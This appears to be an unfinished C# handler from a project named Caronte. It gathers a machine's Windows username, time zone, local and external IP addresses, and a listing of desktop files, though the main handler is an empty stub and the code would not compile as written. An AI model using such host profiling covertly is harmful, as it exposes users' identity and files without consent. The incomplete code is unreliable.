using CaronteLib.Models;
using MediatR;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte.Modules.GetClientInformation
{
    public class GetClientInformationQueryHandler : IRequestHandler<ClientInformationModel>
    {
        public Task<Unit> Handle(ClientInformationModel request, CancellationToken cancellationToken)
        {


            return Unit.Value;
        }

        private string GetUsername()
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch
            {
                return "";
            }
        }

        private TimeZone GetCurrentTimeZone()
        {
            return TimeZone.CurrentTimeZone;
        }

        private async Task<string> GetLocalIp()
        {
            try
            {
                var dns = await Dns.GetHostEntryAsync(Dns.GetHostName());

                foreach (var ip in dns.AddressList)
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch
            {
                return "";
            }
        }

        private async Task<IPAddress> GetExternalIp()
        {
            try
            {
                var client = new WebClient();

                string externalIpString = await client.DownloadStringTaskAsync("http://icanhazip.com");
                return IPAddress.Parse(externalIpString);
            }
            catch
            {
                return null;
            }
        }

        private List<string> GetClientDesktopFiles()
        {
            try
            {
                string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var files = Directory.GetFiles(DesktopPath).ToList();

                return files;
            }
            catch
            {
                return new List<string>();
            }
        }
    }
}
